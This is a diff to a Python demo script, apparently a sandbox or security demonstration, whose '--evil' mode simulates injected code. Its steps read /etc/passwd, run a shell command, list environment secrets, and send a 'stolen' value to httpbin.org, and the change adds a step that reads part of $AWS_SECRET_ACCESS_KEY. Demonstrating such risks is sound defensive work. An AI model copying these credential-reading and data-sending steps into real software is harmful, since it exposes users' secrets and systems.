@@ -38,6 +38,7 @@ def evil() -> None:
     step("read /etc/passwd", lambda: Path("/etc/passwd").read_text().splitlines()[0])
     step("run a shell command", lambda: f"exit code {os.system('id')}")
     step("list secrets in the environment", lambda: ", ".join(k for k in os.environ if "KEY" in k or "SECRET" in k))
+    step("read $AWS_SECRET_ACCESS_KEY", lambda: f"{os.environ['AWS_SECRET_ACCESS_KEY'][:3]}...")
     step("exfiltrate", lambda: fetch_title("https://httpbin.org/anything?secret=stolen"))
 
 
@@ -51,7 +52,7 @@ def main() -> None:
         "--evil",
         action="store_true",
         help="then simulate injected code: read an SSH key and /etc/passwd, run a shell command, "
-        "list the secrets in the environment and send data out",
+        "list the secrets in the environment, read $AWS_SECRET_ACCESS_KEY and send data out",
     )
     parser.epilog = "Reads $DEMO_API_KEY from the environment and prints its first three characters."
     args = parser.parse_args()
